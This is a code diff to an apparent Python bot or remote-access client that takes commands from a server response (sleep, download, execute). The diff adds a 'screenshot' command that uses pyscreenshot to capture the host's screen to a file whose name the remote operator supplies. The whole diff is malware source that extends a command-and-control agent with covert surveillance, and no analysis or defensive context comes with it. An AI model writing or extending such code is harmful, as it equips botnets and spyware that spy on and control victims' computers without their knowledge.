@@ -5,6 +5,7 @@ import subprocess
 import time
 import uuid
 from optparse import OptionParser
+import pyscreenshot as ImageGrab
 
 botID = []
 
@@ -67,6 +68,9 @@ def parse(response, proxies):
     return "slept for "+str(commands[1])+'\n'
   if commands[0] == "download":
     return "saved to "+str(download(commands[1], proxies))+'\n'
+  if commands[0] == "screenshot":
+    ImageGrab.grab_to_file(commands[1]+".png")
+    return "saved to "+str(commands[1])+'.png\n'
   else: return 0
 
 def execute(command):
